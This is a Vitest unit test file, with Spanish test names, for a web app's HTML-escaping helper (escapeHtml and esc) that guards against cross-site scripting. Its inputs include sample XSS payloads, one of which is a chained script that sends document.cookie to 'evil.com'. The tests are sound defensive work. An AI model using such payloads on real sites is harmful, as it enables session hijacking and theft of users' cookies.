// =====================================================
// Tests: escape HTML (XSS prevention)
// =====================================================
import { describe, it, expect } from "vitest";
import { escapeHtml, esc } from "../js/ui.js";

describe("escapeHtml", () => {
  it("escapa < y >", () => {
    expect(escapeHtml("<script>alert('xss')</script>")).toBe("&lt;script&gt;alert('xss')&lt;/script&gt;");
  });

  it("escapa comillas dobles", () => {
    expect(escapeHtml(`"onerror="alert(1)`)).toBe("&quot;onerror=&quot;alert(1)");
  });

  it("escapa comillas simples", () => {
    expect(escapeHtml("' onload='alert(1)")).toBe("&#39; onload=&#39;alert(1)");
  });

  it("escapa &", () => {
    expect(escapeHtml("foo & bar")).toBe("foo &amp; bar");
  });

  it("devuelve string vacío para null/undefined", () => {
    expect(escapeHtml(null)).toBe("");
    expect(escapeHtml(undefined)).toBe("");
  });

  it("convierte números a string", () => {
    expect(escapeHtml(42)).toBe("42");
    expect(escapeHtml(0)).toBe("0");
  });

  it("no altera texto seguro", () => {
    expect(escapeHtml("Hola Mundo 123")).toBe("Hola Mundo 123");
  });

  it("esc múltiples ataques encadenados", () => {
    const evil = `</td><script>fetch('evil.com/'+document.cookie)</script><td>`;
    const escaped = escapeHtml(evil);
    expect(escaped).not.toContain("<script>");
    expect(escaped).not.toContain("</td>");
    expect(escaped).toContain("&lt;script&gt;");
  });
});

describe("esc", () => {
  it("alias de escapeHtml para strings", () => {
    expect(esc("<b>")).toBe("&lt;b&gt;");
  });

  it("maneja null", () => {
    expect(esc(null)).toBe("");
  });

  it("convierte objetos a string antes de escapar", () => {
    expect(esc(123)).toBe("123");
  });
});
